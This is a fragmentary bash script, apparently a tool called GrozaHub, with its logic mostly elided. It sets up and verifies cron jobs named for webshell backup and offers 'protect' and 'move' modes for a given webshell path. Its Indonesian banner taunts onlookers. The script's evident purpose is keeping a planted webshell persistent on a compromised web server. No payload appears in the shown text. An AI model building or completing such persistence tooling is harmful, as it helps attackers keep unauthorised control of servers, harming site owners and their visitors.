...
banner() {
    echo -e "${CYAN}"
    echo -e "Cie Kepo yaa? Made by @snapdowg | sana pigi jauh jauh kau heker slot"
    echo -e "${NC}"
}
...
setup_cron() {
    ...
    crontab -l 2>/dev/null | grep -v "webshell_backup\|groza" | crontab -
...
verify() {
    ...
    echo -e "\n${YELLOW}Cron jobs:${NC}"
    crontab -l | grep -E "webshell|groza"
}
...
case "${1:-}" in
    ...
    -m|--move)
        ...
        echo -e "${CYAN}GrozaHub - @groza_hub | @grozaofficial${NC}"
        ;;
    -p|--protect|"")
        banner
        WEBSHELL_PATH="${2:-$1}"
